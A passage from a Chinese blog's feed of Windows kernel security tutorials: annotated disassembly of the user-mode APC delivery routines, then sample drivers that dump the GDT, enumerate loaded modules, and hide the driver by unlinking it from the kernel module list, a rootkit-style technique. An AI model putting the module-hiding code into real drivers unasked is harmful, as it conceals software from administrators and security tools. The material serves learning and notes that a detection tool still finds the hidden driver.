class="token operator">=</span> CPPEH_RECORD ptr <span class="token operator">-</span><span class="token number">18h</span>arg_0<span class="token operator">=</span> dword ptr  <span class="token number">8</span>arg_4<span class="token operator">=</span> dword ptr  <span class="token number">0Ch</span>arg_8<span class="token operator">=</span> dword ptr  <span class="token number">10h</span>arg_C<span class="token operator">=</span> dword ptr  <span class="token number">14h</span>arg_10<span class="token operator">=</span> dword ptr  <span class="token number">18h</span>arg_14<span class="token operator">=</span> dword ptr  <span class="token number">1Ch</span><span class="token comment">; __unwind &#123; // __SEH_prolog</span>push    <span class="token number">33Ch</span>push    offset stru_804DA0B0call    __SEH_prologmov     <span class="token register variable">eax</span>, ___security_cookiemov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_1C<span class="token operator">]</span>, <span class="token register variable">eax</span>mov     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>arg_0<span class="token operator">]</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_2F4<span class="token operator">]</span>, <span class="token register variable">eax</span>mov     <span class="token register variable">ebx</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>arg_4<span class="token operator">]</span>                <span class="token comment">; 获取TrapFrame</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>BugCheckParameter3<span class="token operator">]</span>, <span class="token register variable">ebx</span>test    byte ptr <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">+</span><span class="token number">72h</span><span class="token operator">]</span>, <span class="token number">2</span>           <span class="token comment">; 判断是否为V86模式</span>jnz     loc_80502B7Bmov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_2E8<span class="token operator">]</span>, <span class="token number">10017h</span>lea     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_2E8<span class="token operator">]</span>              <span class="token comment">; 获取ContextFrame</span>push    <span class="token register variable">ecx</span>push    <span class="token register variable">eax</span>push    <span class="token register variable">ebx</span>call    _KeContextFromKframes@<span class="token number">12</span>        <span class="token comment">; 备份TrapFrame</span><span class="token comment">;   __try &#123; // __except at loc_80502B4E</span>and     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>ms_exc.registration.TryLevel<span class="token operator">]</span>, <span class="token number">0</span>mov     <span class="token register variable">eax</span>, <span class="token number">2DCh</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_2F8<span class="token operator">]</span>, <span class="token register variable">eax</span>mov     <span class="token register variable">esi</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_224<span class="token operator">]</span>              <span class="token comment">; 获取原栈顶ESP3</span>and     <span class="token register variable">esi</span>, <span class="token number">0FFFFFFFCh</span>                 <span class="token comment">; 将栈顶按4字节对齐</span>sub     <span class="token register variable">esi</span>, <span class="token register variable">eax</span>                        <span class="token comment">; 抬栈（ContextFrame + 4个参数）</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_2EC<span class="token operator">]</span>, <span class="token register variable">esi</span>push    <span class="token number">4</span>                               <span class="token comment">; Alignment</span>push    <span class="token register variable">eax</span>                             <span class="token comment">; Length</span>push    <span class="token register variable">esi</span>                             <span class="token comment">; Address</span>call    _ProbeForWrite@<span class="token number">12</span>               <span class="token comment">; ProbeForWrite(x,x,x)</span>lea     <span class="token register variable">edi</span>, <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">10h</span><span class="token operator">]</span>                  <span class="token comment">; 复制TrapFrame到ContextFrame中</span>mov     <span class="token register variable">ecx</span>, <span class="token number">0B3h</span>lea     <span class="token register variable">esi</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_2E8<span class="token operator">]</span>rep movsdmov     dword ptr <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">+</span><span class="token number">6Ch</span><span class="token operator">]</span>, <span class="token number">1Bh</span>        <span class="token comment">; 修改TrapFrame中的CS</span>push    <span class="token number">23h</span> <span class="token comment">; '#'</span>pop     <span class="token register variable">eax</span>mov     <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">+</span><span class="token number">78h</span><span class="token operator">]</span>, <span class="token register variable">eax</span>                  <span class="token comment">; 修改TrapFrame中的SS，DS，ES，FS，GS</span>mov     <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">+</span><span class="token number">38h</span><span class="token operator">]</span>, <span class="token register variable">eax</span>mov     <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">+</span><span class="token number">34h</span><span class="token operator">]</span>, <span class="token register variable">eax</span>mov     dword ptr <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">+</span><span class="token number">50h</span><span class="token operator">]</span>, <span class="token number">3Bh</span> <span class="token comment">; ';'</span>and     dword ptr <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">+</span><span class="token number">30h</span><span class="token operator">]</span>, <span class="token number">0</span>mov     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_228<span class="token operator">]</span>              <span class="token comment">; 获取ContextFrame中的EFlags</span>test    <span class="token register variable">ecx</span>, <span class="token number">20000h</span>                     <span class="token comment">; 判断是否为V86模式</span>jz      short loc_80502AC6              <span class="token comment">; 是V86模式则跳转</span>cmp     byte ptr _KeI386VdmIoplAllowed, <span class="token number">0</span>jz      short loc_80502AC6mov     <span class="token register variable">eax</span>, _KeI386EFlagsAndMaskV86and     <span class="token register variable">eax</span>, <span class="token register variable">ecx</span>or      <span class="token register variable">eax</span>, _KeI386EFlagsOrMaskV86jmp     short loc_80502AD4<span class="token comment">; ---------------------------------------------------------------------------</span><span class="token label function">loc_80502AC6:</span>                           <span class="token comment">; CODE XREF: KiInitializeUserApc(x,x,x,x,x,x)+AE↑j</span>                                        <span class="token comment">; KiInitializeUserApc(x,x,x,x,x,x)+B7↑j</span>and     <span class="token register variable">ecx</span>, <span class="token number">3E0DD7h</span>or      <span class="token register variable">ecx</span>, <span class="token number">200h</span>mov     <span class="token register variable">eax</span>, <span class="token register variable">ecx</span><span class="token label function">loc_80502AD4:</span>                           <span class="token comment">; CODE XREF: KiInitializeUserApc(x,x,x,x,x,x)+C6↑j</span>mov     <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">+</span><span class="token number">70h</span><span class="token operator">]</span>, <span class="token register variable">eax</span>mov     <span class="token register variable">eax</span>, large <span class="token register variable">fs</span>:<span class="token number">124h</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_2FC<span class="token operator">]</span>, <span class="token register variable">eax</span>cmp     byte ptr <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">30h</span><span class="token operator">]</span>, <span class="token number">0</span>jz      short loc_80502AED              <span class="token comment">; 获取当前3环栈顶</span>or      byte ptr <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">+</span><span class="token number">71h</span><span class="token operator">]</span>, <span class="token number">30h</span><span class="token label function">loc_80502AED:</span>                           <span class="token comment">; CODE XREF: KiInitializeUserApc(x,x,x,x,x,x)+E9↑j</span>mov     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_2EC<span class="token operator">]</span>              <span class="token comment">; 获取当前3环栈顶</span>mov     <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">+</span><span class="token number">74h</span><span class="token operator">]</span>, <span class="token register variable">eax</span>                  <span class="token comment">; 修改TrapFrame中的ESP</span>mov     <span class="token register variable">ecx</span>, _KeUserApcDispatcher       <span class="token comment">; 获取KiUserApcDispatcher函数地址</span>mov     <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">+</span><span class="token number">68h</span><span class="token operator">]</span>, <span class="token register variable">ecx</span>                  <span class="token comment">; 将函数地址赋给TrapFrame中的EIP</span>and     dword ptr <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">+</span><span class="token number">64h</span><span class="token operator">]</span>, <span class="token number">0</span>          <span class="token comment">; ErrorCode置0</span>mov     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>arg_8<span class="token operator">]</span>                <span class="token comment">; 获取NormalRoutine</span>mov     <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">]</span>, <span class="token register variable">ecx</span>                      <span class="token comment">; 将NormalRoutine赋值到栈顶地址</span>push    <span class="token number">4</span>pop     <span class="token register variable">ecx</span>add     <span class="token register variable">eax</span>, <span class="token register variable">ecx</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_2EC<span class="token operator">]</span>, <span class="token register variable">eax</span>mov     <span class="token register variable">edx</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>arg_C<span class="token operator">]</span>                <span class="token comment">; 获取NormalContext</span>mov     <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">]</span>, <span class="token register variable">edx</span>                      <span class="token comment">; 放入栈顶下的地址</span>add     <span class="token register variable">eax</span>, <span class="token register variable">ecx</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_2EC<span class="token operator">]</span>, <span class="token register variable">eax</span>mov     <span class="token register variable">edx</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>arg_10<span class="token operator">]</span>               <span class="token comment">; 获取Arg1, Arg2</span>mov     <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">]</span>, <span class="token register variable">edx</span>add     <span class="token register variable">eax</span>, <span class="token register variable">ecx</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_2EC<span class="token operator">]</span>, <span class="token register variable">eax</span>mov     <span class="token register variable">edx</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>arg_14<span class="token operator">]</span>mov     <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">]</span>, <span class="token register variable">edx</span>add     <span class="token register variable">eax</span>, <span class="token register variable">ecx</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_2EC<span class="token operator">]</span>, <span class="token register variable">eax</span>jmp     short loc_80502B77<span class="token comment">; ---------------------------------------------------------------------------</span><span class="token label function">loc_80502B3C:</span>                           <span class="token comment">; DATA XREF: .text:stru_804DA0B0↑o</span><span class="token comment">;   __except filter // owned by 80502A49</span>mov     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>ms_exc.exc_ptr<span class="token operator">]</span>push    dword ptr <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">]</span>lea     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>ExceptionRecord<span class="token operator">]</span>push    <span class="token register variable">eax</span>call    _KiCopyInformation@<span class="token number">8</span>            <span class="token comment">; KiCopyInformation(x,x)</span>retn<span class="token comment">; ---------------------------------------------------------------------------</span><span class="token label function">loc_80502B4E:</span>                           <span class="token comment">; DATA XREF: .text:stru_804DA0B0↑o</span><span class="token comment">;   __except(loc_80502B3C) // owned by 80502A49</span>mov     <span class="token register variable">esp</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>ms_exc.old_esp<span class="token operator">]</span>mov     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>BugCheckParameter3<span class="token operator">]</span>mov     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">68h</span><span class="token operator">]</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>ExceptionRecord.ExceptionAddress<span class="token operator">]</span>, <span class="token register variable">ecx</span>push    <span class="token number">1</span>                               <span class="token comment">; char</span>push    <span class="token number">1</span>                               <span class="token comment">; int</span>push    <span class="token register variable">eax</span>                             <span class="token comment">; BugCheckParameter3</span>push    <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_2F4<span class="token operator">]</span>                   <span class="token comment">; int</span>lea     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>ExceptionRecord<span class="token operator">]</span>push    <span class="token register variable">eax</span>                             <span class="token comment">; ExceptionRecord</span>call    _KiDispatchException@<span class="token number">20</span>         <span class="token comment">; KiDispatchException(x,x,x,x,x)</span><span class="token comment">;   &#125; // starts at 80502A49</span><span class="token label function">loc_80502B77:</span>                           <span class="token comment">; CODE XREF: KiInitializeUserApc(x,x,x,x,x,x)+13C↑j</span>or      <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>ms_exc.registration.TryLevel<span class="token operator">]</span>, <span class="token number">0FFFFFFFFh</span><span class="token label function">loc_80502B7B:</span>                           <span class="token comment">; CODE XREF: KiInitializeUserApc(x,x,x,x,x,x)+2D↑j</span>mov     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_1C<span class="token operator">]</span>call    @xHalReferenceHandler@<span class="token number">4</span>         <span class="token comment">; xHalReferenceHandler(x)</span>call    __SEH_epilogretn    <span class="token number">18h</span><span class="token comment">; &#125; // starts at 805029FE</span>_KiInitializeUserApc@<span class="token number">24</span> endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="KiUserApcDispatcher"><a href="#KiUserApcDispatcher" class="headerlink" title="KiUserApcDispatcher"></a>KiUserApcDispatcher</h4><p>函数定义：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">VOID <span class="token function">KiUserApcDispatcher</span> <span class="token punctuation">(</span>    IN PVOID NormalContext<span class="token punctuation">,</span>    IN PVOID SystemArgument1<span class="token punctuation">,</span>    IN PVOID SystemArgument2<span class="token punctuation">,</span>    IN PKNORMAL_ROUTINE NormalRoutine<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码分析：</p><pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">_KiUserApcDispatcher@<span class="token number">20</span> proc neararg_C<span class="token operator">=</span> byte ptr  <span class="token number">10h</span>lea     <span class="token register variable">edi</span>, <span class="token operator">[</span><span class="token register variable">esp</span><span class="token operator">+</span>arg_C<span class="token operator">]</span>                <span class="token comment">; 获取ContextFrame</span>pop     <span class="token register variable">eax</span>                             <span class="token comment">; 获取NormalContext</span>call    <span class="token register variable">eax</span>                             <span class="token comment">; 调用用户层APC函数</span>push    <span class="token number">1</span>push    <span class="token register variable">edi</span>                             <span class="token comment">; 压入ContextFrame</span>call    _ZwContinue@<span class="token number">8</span>                   <span class="token comment">; 返回0环</span>nop_KiUserApcDispatcher@<span class="token number">20</span> endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-参考"><a href="#4-参考" class="headerlink" title="4 参考"></a>4 参考</h2><ul><li>羽夏的博客：<a href="https://www.cnblogs.com/wingsummer/p/15590522.html">https://www.cnblogs.com/wingsummer/p/15590522.html</a></li><li>lzyddf的博客：<a href="https://blog.csdn.net/qq_41988448/category_9429987_1.html">https://blog.csdn.net/qq_41988448/category_9429987_1.html</a></li><li>周壑的视频教程： <a href="https://space.bilibili.com/37877654/channel/seriesdetail?sid=1467296">https://space.bilibili.com/37877654/channel/seriesdetail?sid=1467296</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-进程与线程&quot;&gt;&lt;a href=&quot;#1-进程与线程&quot; class=&quot;headerlink&quot; title=&quot;1 进程与线程&quot;&gt;&lt;/a&gt;1 进程与线程&lt;/h2&gt;&lt;h3 id=&quot;1-1-进程结构体&quot;&gt;&lt;a href=&quot;#1-1-进程结构体&quot; class=&quot;header</summary>
      
    
    
    
    <category term="Windows" scheme="http://reop.cc/categories/Windows/"/>
    
    
  </entry>
  
  <entry>
    <title>驱动、句柄和系统调用——Windows安全入门（三）</title>
    <link href="http://reop.cc/Windows/f53a5d4a7ae2.html"/>
    <id>http://reop.cc/Windows/f53a5d4a7ae2.html</id>
    <published>2024-03-19T16:00:00.000Z</published>
    <updated>2024-03-28T12:24:45.397Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-驱动"><a href="#1-驱动" class="headerlink" title="1 驱动"></a>1 驱动</h2><h3 id="1-1-内核编程基础"><a href="#1-1-内核编程基础" class="headerlink" title="1.1 内核编程基础"></a>1.1 内核编程基础</h3><h4 id="简单的驱动程序"><a href="#简单的驱动程序" class="headerlink" title="简单的驱动程序"></a>简单的驱动程序</h4><p>读取GDT并打印：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;ntddk.h></span>    </span>NTSTATUS <span class="token function">UnloadDriver</span><span class="token punctuation">(</span>PDRIVER_OBJECT DriverObject<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> STATUS_SUCCESS<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>NTSTATUS <span class="token function">DriverEntry</span><span class="token punctuation">(</span>PDRIVER_OBJECT DriverObject<span class="token punctuation">,</span> PUNICODE_STRING RegistryPath<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"Hello Driver!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    DriverObject<span class="token operator">-></span>DriverUnload <span class="token operator">=</span> UnloadDriver<span class="token punctuation">;</span>    <span class="token keyword">char</span> gdt<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    _asm <span class="token punctuation">&#123;</span>        sgdt gdt<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    USHORT limit <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>USHORT<span class="token operator">*</span><span class="token punctuation">)</span>gdt<span class="token punctuation">;</span>    UINT32 base <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>UINT32<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>gdt<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    UINT32<span class="token operator">*</span> mem <span class="token operator">=</span> <span class="token punctuation">(</span>UINT32<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">ExAllocatePoolWithTag</span><span class="token punctuation">(</span>NonPagedPool<span class="token punctuation">,</span> limit<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>mem<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"Allocate Failed!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">RtlMoveMemory</span><span class="token punctuation">(</span>mem<span class="token punctuation">,</span> base<span class="token punctuation">,</span> limit<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> limit <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">+=</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"GDT[%d]:\t %0.8x`%0.8x\n"</span><span class="token punctuation">,</span> i <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">,</span> mem<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> mem<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">ExFreePool</span><span class="token punctuation">(</span>mem<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> STATUS_SUCCESS<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="DRIVER-OBJECT"><a href="#DRIVER-OBJECT" class="headerlink" title="DRIVER_OBJECT"></a>DRIVER_OBJECT</h4><p>DRIVER_OBJECT结构体中存储当前驱动的所有信息：<br><img src="/images/3-3.png" alt="3-3"></p><ul><li>DriverStart：驱动对象加载后的起始地址；</li><li>DriverSize：驱动对象加载后的大小；</li><li>DriverSection：当前驱动在LDR_DATA_TABLE_ENTRY链表中的起始地址；</li></ul><h4 id="LDR-DATA-TABLE-ENTRY"><a href="#LDR-DATA-TABLE-ENTRY" class="headerlink" title="LDR_DATA_TABLE_ENTRY"></a>LDR_DATA_TABLE_ENTRY</h4><p>此结构体构成的双向链表存储所有加载的内核驱动信息：<br><img src="/images/3-4.png" alt="3-4"></p><h4 id="IRQL"><a href="#IRQL" class="headerlink" title="IRQL"></a>IRQL</h4><p>由Windows系统提供的一套中断执行优先级，数字越大优先级越高：</p><table><thead><tr><th>IRQL</th><th>宏</th><th>说明</th></tr></thead><tbody><tr><td>0</td><td>PASSIVE_LEVEL</td><td>最低级别，不屏蔽任何中断，用于用户模式的线程；</td></tr><tr><td>1</td><td>APC_LEVEL</td><td>屏蔽其他APC级别的中断，用于异步过程调用；</td></tr><tr><td>2</td><td>DISPATCH_LEVEL</td><td>&lt;&#x3D;2的中断被屏蔽，不能访问分页内存，主要用于<br>进程切换；</td></tr><tr><td>3-26</td><td>Device IRQL</td><td>屏蔽几乎所有中断，用于外部设备；</td></tr><tr><td>27</td><td>PROFILE_LEVEL</td><td>性能剖析；</td></tr><tr><td>28</td><td>CLOCK_LEVEL</td><td>时钟中断；</td></tr><tr><td>29</td><td>IPL_LEVEL</td><td>处理器间中断；</td></tr><tr><td>30</td><td>POWER_LEVEL</td><td>电源中断；</td></tr><tr><td>31</td><td>HIGH_LEVEL</td><td>最高中断层；</td></tr></tbody></table><h3 id="1-2-实验1：隐藏内核模块"><a href="#1-2-实验1：隐藏内核模块" class="headerlink" title="1.2 实验1：隐藏内核模块"></a>1.2 实验1：隐藏内核模块</h3><p>遍历内核模块：<br><img src="/images/3-5.png" alt="3-5"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;ntddk.h></span>    </span>NTSTATUS <span class="token function">UnloadDriver</span><span class="token punctuation">(</span>PDRIVER_OBJECT DriverObject<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> STATUS_SUCCESS<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>NTSTATUS <span class="token function">DriverEntry</span><span class="token punctuation">(</span>PDRIVER_OBJECT DriverObject<span class="token punctuation">,</span> PUNICODE_STRING RegistryPath<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"Hello Driver!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    DriverObject<span class="token operator">-></span>DriverUnload <span class="token operator">=</span> UnloadDriver<span class="token punctuation">;</span>    LIST_ENTRY<span class="token operator">*</span> pEntry <span class="token operator">=</span> DriverObject<span class="token operator">-></span>DriverSection<span class="token punctuation">;</span>    LIST_ENTRY<span class="token operator">*</span> pCurrentEntry <span class="token operator">=</span> pEntry<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        PUNICODE_STRING name <span class="token operator">=</span> <span class="token punctuation">(</span>PUNICODE_STRING<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>UINT32<span class="token punctuation">)</span>pEntry<span class="token operator">+</span><span class="token number">0x2c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"DriverName : %wZ\n"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>        pEntry <span class="token operator">=</span> pEntry<span class="token operator">-></span>Flink<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>pEntry <span class="token operator">==</span> pCurrentEntry<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> STATUS_SUCCESS<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改双向链表，去掉当前节点：<br>使用XueTr工具仍然可以检测到隐藏后的驱动：<br><img src="/images/3-6.png" alt="3-6"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;ntddk.h></span>    </span>LIST_ENTRY<span class="token operator">*</span> pCurrentEntry<span class="token punctuation">;</span>LIST_ENTRY<span class="token operator">*</span> pBeforeEntry<span class="token punctuation">;</span>LIST_ENTRY<span class="token operator">*</span> pFrontEntry<span class="token punctuation">;</span>NTSTATUS <span class="token function">UnloadDriver</span><span class="token punctuation">(</span>PDRIVER_OBJECT DriverObject<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    pBeforeEntry<span class="token operator">-></span>Flink <span class="token operator">=</span> pCurrentEntry<span class="token punctuation">;</span>    pFrontEntry<span class="token operator">-></span>Blink <span class="token operator">=</span> pCurrentEntry<span class="token punctuation">;</span>    <span class="token keyword">return</span> STATUS_SUCCESS<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>NTSTATUS <span class="token function">DriverEntry</span><span class="token punctuation">(</span>PDRIVER_OBJECT DriverObject<span class="token punctuation">,</span> PUNICODE_STRING RegistryPath<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"Hello Driver!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    DriverObject<span class="token operator">-></span>DriverUnload <span class="token operator">=</span> UnloadDriver<span class="token punctuation">;</span>    pCurrentEntry <span class="token operator">=</span> DriverObject<span class="token operator">-></span>DriverSection<span class="token punctuation">;</span>    pBeforeEntry <span class="token operator">=</span> pCurrentEntry<span class="token operator">-></span>Blink<span class="token punctuation">;</span>    pFrontEntry <span class="token operator">=</span> pCurrentEntry<span class="token operator">-></span>Flink<span class="token punctuation">;</span>    pBeforeEntry<span class="token operator">-></span>Flink <span class="token operator">=</span> pFrontEntry<span class="token punctuation">;</span>    pFrontEntry<span class="token operator">-></span>Blink <span class="token operator">=</span> pBeforeEntry<span class="token punctuation">;</span>    <span class="token keyword">return</span> STATUS_SUCCESS<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-3-实验2：设备通信"><a href="#1-3-实验2：设备通信" class="headerlink" title="1.3 实验2：设备通信"></a>1.3 